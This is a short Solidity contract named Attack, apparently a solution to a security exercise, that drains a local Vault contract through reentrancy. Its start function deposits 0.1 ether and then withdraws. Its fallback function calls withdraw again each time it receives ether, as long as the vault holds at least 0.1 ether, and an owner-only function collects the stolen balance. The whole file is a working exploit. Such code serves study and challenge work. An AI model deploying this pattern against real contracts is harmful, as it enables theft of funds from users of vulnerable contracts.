// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";

contract Attack {
    address public owner;
    Vault vault;

    constructor(address payable _vault) public payable {
        vault = Vault(_vault);
        owner = msg.sender;
    }

    fallback() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.withdraw();
        }
    }

    function start() public {
        vault.deposite{value: 0.1 ether}();
        vault.withdraw();
    }

    function withdraw() public {
        if (owner == msg.sender) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            revert("not owner");
        }
    }

}
